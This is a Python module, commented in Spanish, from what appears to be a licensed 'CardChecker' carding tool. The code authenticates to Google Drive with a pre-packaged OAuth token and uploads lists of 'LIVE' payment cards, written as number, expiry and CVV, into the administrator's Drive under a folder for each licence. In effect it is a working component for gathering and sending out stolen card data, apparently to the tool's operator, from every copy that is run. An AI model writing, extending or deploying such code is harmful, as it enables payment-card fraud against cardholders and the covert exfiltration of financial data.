"""
Google Drive Uploader
Sube resultados LIVE organizados por licencia a Google Drive usando OAuth
Todos los usuarios suben al Drive del administrador con credenciales compartidas
"""
import json
import pickle
from datetime import datetime
from pathlib import Path
from typing import List, Dict

try:
    from google.auth.transport.requests import Request
    from google.oauth2.credentials import Credentials
    from google_auth_oauthlib.flow import InstalledAppFlow
    from googleapiclient.discovery import build
    from googleapiclient.http import MediaInMemoryUpload
    GDRIVE_AVAILABLE = True
except ImportError:
    GDRIVE_AVAILABLE = False

SCOPES = ['https://www.googleapis.com/auth/drive.file']


class GDriveUploader:
    """Gestor de subida de resultados a Google Drive con OAuth"""
    
    def __init__(self, license_key: str, root_folder_id: str = None):
        self.license_key = license_key
        self.service = None
        self.root_folder_id = root_folder_id  # ID de carpeta compartida
        self.license_folder_id = None
        
    def authenticate(self, credentials_file: str, token_file: str) -> bool:
        """
        Autentica con Google Drive usando OAuth.
        
        Args:
            credentials_file: Ruta al archivo client_secret.json (OAuth credentials)
            token_file: Ruta donde se guarda el token (empaquetado en el exe)
        
        Returns:
            True si la autenticación fue exitosa
        """
        if not GDRIVE_AVAILABLE:
            return False
            
        try:
            creds = None
            
            # Verificar si existe token guardado (empaquetado)
            token_path = Path(token_file)
            if token_path.exists():
                with open(token_path, 'rb') as token:
                    creds = pickle.load(token)
            
            # Si no hay credenciales válidas, no podemos autenticar
            # (en modo empaquetado, el token debe estar pre-generado)
            if not creds or not creds.valid:
                if creds and creds.expired and creds.refresh_token:
                    creds.refresh(Request())
                else:
                    # Sin credenciales válidas, no se puede autenticar
                    return False
            
            self.service = build('drive', 'v3', credentials=creds)
            return True
            
        except Exception as e:
            print(f"Error autenticando con Google Drive: {e}")
            return False
    
    def _get_or_create_folder(self, folder_name: str, parent_id: str = None) -> str:
        """
        Obtiene el ID de una carpeta o la crea si no existe.
        
        Args:
            folder_name: Nombre de la carpeta
            parent_id: ID de la carpeta padre (None = raíz)
        
        Returns:
            ID de la carpeta
        """
        # Buscar carpeta existente
        query = f"name='{folder_name}' and mimeType='application/vnd.google-apps.folder' and trashed=false"
        if parent_id:
            query += f" and '{parent_id}' in parents"
        
        results = self.service.files().list(
            q=query,
            spaces='drive',
            fields='files(id, name)'
        ).execute()
        
        files = results.get('files', [])
        
        if files:
            return files[0]['id']
        
        # Crear carpeta si no existe
        file_metadata = {
            'name': folder_name,
            'mimeType': 'application/vnd.google-apps.folder'
        }
        
        if parent_id:
            file_metadata['parents'] = [parent_id]
        
        folder = self.service.files().create(
            body=file_metadata,
            fields='id'
        ).execute()
        
        return folder.get('id')
    
    def setup_folders(self) -> bool:
        """
        Crea estructura de carpetas en la carpeta compartida:
        CardChecker (compartida)/
          └─ CCR-XXXX-XXXX/
              ├─ live_cards.txt
              └─ live_cvv_invalid.txt
        
        Returns:
            True si se crearon las carpetas correctamente
        """
        if not self.service:
            return False
        
        try:
            # Si no se especificó root_folder_id, buscar o crear "CardChecker"
            if not self.root_folder_id:
                self.root_folder_id = self._get_or_create_folder("CardChecker")
            
            # Carpeta de la licencia dentro de la carpeta compartida
            self.license_folder_id = self._get_or_create_folder(
                self.license_key,
                self.root_folder_id
            )
            
            return True
            
        except Exception as e:
            print(f"Error creando carpetas: {e}")
            return False
    
    def upload_results(self, live_cards: List[Dict], live_cvv_invalid: List[Dict]) -> bool:
        """
        Sube resultados LIVE a Google Drive.
        
        Args:
            live_cards: Lista de tarjetas LIVE (CVV válido)
            live_cvv_invalid: Lista de tarjetas LIVE con CVV inválido
        
        Returns:
            True si se subió correctamente
        """
        if not self.service or not self.license_folder_id:
            return False
        
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            
            # Subir LIVE con CVV válido
            if live_cards:
                content = self._format_cards(live_cards, "LIVE - CVV Válido")
                filename = f"live_cards_{timestamp}.txt"
                self._upload_file(filename, content, self.license_folder_id)
            
            # Subir LIVE con CVV inválido
            if live_cvv_invalid:
                content = self._format_cards(live_cvv_invalid, "LIVE - CVV Inválido")
                filename = f"live_cvv_invalid_{timestamp}.txt"
                self._upload_file(filename, content, self.license_folder_id)
            
            return True
            
        except Exception as e:
            print(f"Error subiendo resultados: {e}")
            return False
    
    def _format_cards(self, cards: List[Dict], title: str) -> str:
        """Formatea lista de tarjetas para archivo de texto"""
        lines = [
            f"========================================",
            f"  {title}",
            f"========================================",
            f"Licencia: {self.license_key}",
            f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"Total: {len(cards)} tarjeta(s)",
            f"========================================\n"
        ]
        
        for card in cards:
            lines.append(
                f"{card['number']}|{card['expiry_month']}|{card['expiry_year']}|{card['cvv']}"
            )
        
        return "\n".join(lines)
    
    def _upload_file(self, filename: str, content: str, folder_id: str):
        """Sube un archivo de texto a Google Drive"""
        file_metadata = {
            'name': filename,
            'parents': [folder_id]
        }
        
        media = MediaInMemoryUpload(
            content.encode('utf-8'),
            mimetype='text/plain',
            resumable=True
        )
        
        self.service.files().create(
            body=file_metadata,
            media_body=media,
            fields='id'
        ).execute()


def is_gdrive_available() -> bool:
    """Verifica si las librerías de Google Drive están instaladas"""
    return GDRIVE_AVAILABLE
